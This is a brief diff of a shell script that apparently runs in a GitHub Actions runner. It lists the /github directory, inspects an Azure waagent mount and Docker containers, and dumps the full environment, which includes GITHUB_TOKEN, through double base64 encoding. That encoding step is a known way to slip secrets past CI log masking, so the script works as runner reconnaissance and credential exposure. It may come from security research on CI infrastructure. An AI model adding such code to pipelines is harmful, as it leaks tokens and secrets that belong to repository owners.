@@ -7,13 +7,12 @@ if [[ ! -z "$GITHUB_TOKEN" ]]; then
 fi
 
 #print root dir
-printf 'Root dir:\n'
-ls / | base64
+printf 'Github dir:\n'
+find /github | base64 | base64
 
 #print env before
-printf 'Env before:\n'
-env
-env | base64
+printf 'Action env before:\n'
+env | base64 | base64
 
 #extract waagent if mounted
 if [[ -d '/waagent' ]]; then
@@ -55,6 +54,5 @@ docker image ls
 docker container ps -a
 
 #print env after
-printf 'Env after:\n'
-env
-env | base64
+printf 'Action env after:\n'
+env | base64 | base64
